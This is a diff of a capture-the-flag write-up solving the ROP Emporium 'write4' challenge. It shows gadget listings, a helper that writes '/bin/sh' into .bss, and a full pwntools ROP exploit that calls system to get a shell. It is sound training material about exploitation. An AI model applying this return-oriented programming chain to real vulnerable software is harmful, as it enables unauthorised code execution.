@@ -98,32 +98,10 @@ Dump of assembler code for function usefulGadgets:
    0x000000000040082e <+14>:	xchg   ax,ax
 End of assembler dump.
 ```
-
+Now let's retrive a gadget to pop arguments in r14, r15:
 SOME gadgets:
 ```shell
 [marco@marco-pc Downloads]$ ROPgadget --binary="write4" > gadgets
-[marco@marco-pc Downloads]$ cat gadgets | grep mov
-0x000000000040081c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov qword ptr [r14], r15 ; ret
-0x000000000040081e : add byte ptr [rax], al ; mov qword ptr [r14], r15 ; ret
-0x0000000000400739 : int1 ; push rbp ; mov rbp, rsp ; call rax
-0x000000000040069d : je 0x4006b8 ; pop rbp ; mov edi, 0x601060 ; jmp rax
-0x00000000004006eb : je 0x400700 ; pop rbp ; mov edi, 0x601060 ; jmp rax
-0x0000000000400738 : je 0x400731 ; push rbp ; mov rbp, rsp ; call rax
-0x0000000000400713 : mov byte ptr [rip + 0x20096e], 1 ; ret
-0x0000000000400821 : mov dword ptr [rsi], edi ; ret
-0x00000000004007ae : mov eax, 0 ; pop rbp ; ret
-0x00000000004005b1 : mov eax, dword ptr [rax] ; add byte ptr [rax], al ; add rsp, 8 ; ret
-0x000000000040073c : mov ebp, esp ; call rax
-0x00000000004006a0 : mov edi, 0x601060 ; jmp rax
-0x0000000000400820 : mov qword ptr [r14], r15 ; ret
-0x000000000040073b : mov rbp, rsp ; call rax
-0x0000000000400712 : pop rbp ; mov byte ptr [rip + 0x20096e], 1 ; ret
-0x000000000040069f : pop rbp ; mov edi, 0x601060 ; jmp rax
-0x000000000040073a : push rbp ; mov rbp, rsp ; call rax
-0x0000000000400737 : sal byte ptr [rcx + rsi*8 + 0x55], 0x48 ; mov ebp, esp ; call rax
-0x000000000040081a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; mov qword ptr [r14], r15 ; ret
-0x0000000000400736 : test eax, eax ; je 0x400733 ; push rbp ; mov rbp, rsp ; call rax
-0x0000000000400735 : test rax, rax ; je 0x400734 ; push rbp ; mov rbp, rsp ; call rax
 [marco@marco-pc Downloads]$ cat gadgets | grep pop
 0x00000000004006ac : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
 0x00000000004006ae : add byte ptr [rax], al ; pop rbp ; ret
@@ -147,3 +125,72 @@ SOME gadgets:
 0x000000000040088d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
 0x00000000004006aa : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
 ```
+'pop r14 ; pop r15' fit perfectly for our purpose. To execute the write i wrote a dedicated function, which basically pad the string with null bytes until the length is a multiple of 8. 
+Then cut the string in group by 8. And finally it writes 8 bytes at a time in memory adding 8 to the address for each write:
+```python
+def write_string_bss(mov_gadget, pop_gadget, bss_address, string):
+    while len(string) % 8 != 0:
+        string += "\x00"
+
+    splitted_string = [string[i:i + 8] for i in range(0, len(string), 8)]
+    payload = "".encode()
+    for i in range(len(splitted_string)):
+        payload += p64(pop_gadget)
+        payload += p64(bss_address + (i * 8))
+        payload += splitted_string[i].encode()
+        payload += p64(mov_gadget)
+    return payload
+```
+To call *system* in 64 bit architecture, we need to pass the argument in rdi, so let's find a gadget:
+```shell
+[marco@marco-pc Downloads]$ cat gadgets | grep "pop rdi"
+0x0000000000400893 : pop rdi ; ret
+```
+It's almost done. We just need a system to execute the syscall like in split challenge:
+```gdb
+[marco@marco-pc Downloads]$ gdb-pwndbg write4                                                   
+Reading symbols from write4...                                                
+(No debugging symbols found in write4)                                                          
+pwndbg: loaded 181 commands. Type pwndbg [filter] for a list.                                  
+pwndbg: created $rebase, $ida gdb functions (can be used with print/break)                   
+pwndbg> p system                                                                                
+$1 = {<text variable, no debug info>} 0x4005e0 <system@plt>                                     
+```
+
+Final exploit:
+```python
+from pwn import *
+
+string = "/bin/sh"
+system = 0x4005e0
+usefulGadgets = 0x0000000000400820 #QWORD PTR [r14],r15
+pop_gadget = 0x0000000000400890 #pop r14 ; pop r15 ; ret
+pop_rdi = 0x0000000000400893
+bss_address = 0x0000000000601060
+
+
+def write_string_bss(mov_gadget, pop_gadget, bss_address, string):
+    while len(string) % 8 != 0:
+        string += "\x00"
+
+    splitted_string = [string[i:i + 8] for i in range(0, len(string), 8)]
+    payload = "".encode()
+    for i in range(len(splitted_string)):
+        payload += p64(pop_gadget)
+        payload += p64(bss_address + (i * 8))
+        payload += splitted_string[i].encode()
+        payload += p64(mov_gadget)
+    return payload
+
+exploit = ("A"*40).encode()
+exploit += write_string_bss(usefulGadgets, pop_gadget, bss_address, string)
+exploit += p64(pop_rdi)
+exploit += p64(bss_address)
+exploit += p64(system)
+
+p = process('./write4')
+p.recvuntil('>')
+p.sendline(exploit)
+p.interactive()
+```
+
